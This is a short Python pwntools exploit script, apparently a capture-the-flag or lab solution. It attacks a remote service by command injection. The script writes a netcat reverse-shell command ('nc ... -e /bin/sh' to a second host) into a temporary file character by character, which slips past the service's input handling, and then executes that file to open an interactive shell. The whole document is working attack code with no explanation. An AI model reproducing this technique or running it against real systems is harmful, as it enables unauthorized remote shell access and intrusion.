from pwn import *
binary_path = './test.py'
p = remote('10.21.232.3', '5252')
#p = remote('localhost', '5252')
# p = process(['python3',binary_path])
# p = process(binary_path)


nc_rev = 'nc 10.21.234.106 4444 -e /bin/sh'
def sanitize(one_char):
    if one_char.isspace() or one_char.isdigit(): return "-n \{}>>/tmp/j &".format(one_char)
    return f"-n {one_char}>>/tmp/j &" 

p.recvuntil(b'Welcome!').decode('utf-8')

# _ = p.recvall()
for char in nc_rev:
    # print(sanitize(char))
    p.sendline(sanitize(char).encode())
    p.sendline(b'y')

p.sendline(b'&& sh /tmp/j')
    
p.interactive()



# p.close()
